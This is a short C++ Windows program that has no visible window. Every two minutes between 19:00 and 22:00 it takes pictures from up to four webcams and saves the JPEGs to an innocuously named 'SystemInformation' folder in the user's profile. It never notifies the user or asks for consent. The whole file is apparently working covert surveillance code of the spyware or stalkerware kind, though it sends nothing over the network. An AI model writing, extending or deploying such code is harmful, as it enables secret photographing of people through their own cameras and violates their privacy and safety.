#include <boost/log/trivial.hpp>
#include <boost/log/utility/setup/file.hpp>
#include <boost/log/utility/setup/console.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>
#include <boost/log/sources/global_logger_storage.hpp>
#include <boost/log/sources/logger.hpp>
#include <boost/log/expressions.hpp>
#include <boost/date_time.hpp>
#include <boost/locale.hpp>
#include <boost/json.hpp>
#include <opencv2/opencv.hpp>
#include <format>
#include <Windows.h>


void startCapture()
{
	WCHAR workDirPath[MAX_PATH]{};
	WCHAR logFilePath[MAX_PATH]{};

	if (!GetEnvironmentVariableW(L"USERPROFILE", workDirPath, MAX_PATH))
	{
		ExitProcess(GetLastError());
	}

	lstrcatW(workDirPath, L"\\SystemInformation\\");

	if (!SetCurrentDirectoryW(workDirPath))
	{
		ExitProcess(GetLastError());
	}

	for (;;)
	{
		SYSTEMTIME time{};
		GetLocalTime(&time);

		if (time.wHour > 18 && time.wHour < 22)
		{
			std::vector<cv::VideoCapture> videoCaptures;

			cv::VideoCapture vc0;
			vc0.open(0);
			if (vc0.isOpened())
			{
				videoCaptures.push_back(vc0);
			}

			cv::VideoCapture vc1;
			vc1.open(1);
			if (vc1.isOpened())
			{
				videoCaptures.push_back(vc1);
			}

			cv::VideoCapture vc2;
			vc2.open(2);
			if (vc2.isOpened())
			{
				videoCaptures.push_back(vc2);
			}

			cv::VideoCapture vc3;
			vc3.open(3);
			if (vc3.isOpened())
			{
				videoCaptures.push_back(vc3);
			}

			for (cv::VideoCapture& i : videoCaptures)
			{
				try 
				{
					cv::Mat t;
					i.read(t);
					cv::imwrite(std::format("tmp_{}_{}_{}_{}_{}.jpg", time.wDay, time.wHour, time.wMinute, time.wSecond, time.wMilliseconds).c_str(), t);
					time.wMilliseconds++;
				}
				catch (cv::Exception e)
				{
					throw;
				}
			}

		}

		Sleep(2 * 60 * 1000);  // 2 minutes
	}
}


int main()
{
	startCapture();
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PSTR pCmdLine, _In_ int nCmdShow)
{
	return main();
}